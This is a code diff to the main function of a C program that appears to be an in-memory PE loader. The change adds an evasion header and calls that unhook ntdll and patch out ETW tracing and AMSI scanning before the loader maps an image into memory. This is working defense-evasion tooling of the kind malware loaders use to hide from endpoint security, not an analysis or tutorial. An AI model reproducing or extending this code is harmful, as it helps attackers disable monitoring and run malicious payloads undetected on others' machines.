@@ -1,3 +1,4 @@
+#include "../include/Evasion.h"
 #include "../include/Loader.h"
 #include "../include/Macros.h"
 #include "../include/Peb.h"
@@ -37,21 +38,29 @@ int main(void) {
 	}
 
 	/// TMP ///////////////////////////////////////////////////////////////
-	
+
 	NtDll = sdGetModuleHandle(NTDLL);
 	Dos = (PIMAGE_DOS_HEADER)(pbBuffer);  // C_PTR( G_END() )
 	NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)Dos + Dos->e_lfanew);
-	
+
 	// Calc memory for image
 	szSizeImage = NtH->OptionalHeader.SizeOfImage; //(((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));
 
-	sdUnhookDll(NTDLL, NtDll);
+	if (!sdUnhookDll(NTDLL, NtDll)) {
+		return 1;
+	}
+	if (!sdPatchEtw(NtDll)) {
+		return 1;
+	}
+	if (!sdPatchAmsi(NtDll)) {
+		return 1;
+	}
 	
 	// Alloc memory for image
 	pdNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)sdGetProcAddress(NtDll, NT_VIRTUAL_ALLOC);
 	NtStatus = pdNtAllocateVirtualMemory(((HANDLE)-1), &PeBase, 0, &szSizeImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (NtStatus != STATUS_SUCCESS || PeBase == NULL) {
-		return 0;
+		return 1;
 	}
 
 	// Copy sections
